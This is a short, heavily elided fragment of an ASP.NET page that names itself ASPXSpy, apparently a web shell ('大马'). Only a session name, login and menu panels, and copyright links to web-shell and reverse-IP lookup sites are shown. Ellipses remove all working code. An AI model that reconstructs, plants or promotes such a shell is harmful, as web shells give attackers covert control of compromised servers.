...
<script runat="server">
    ...
    public string SessionName = "ASPXSpy";//asp大马官网 www.asp-muma.com
...
<body>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            ...
            Copyright (C) 2016 Bin -> <a href="http://www.asp-muma.com" target="_blank">www.asp-muma.com</a></asp:Panel><asp:Panel ID="Bin_MenuPanel" runat="server" Height="56px" Width="771px">
            ...
            <asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False">Copyright (C) 2009 Bin -> <a href="http://www.asp-muma.com" target="_blank">www.asp-muma.com</a> -> <a href="http://www.rootkit.net.cn/index.aspx" target="_blank">Reverse-IP</a> </asp:Label></asp:Panel>
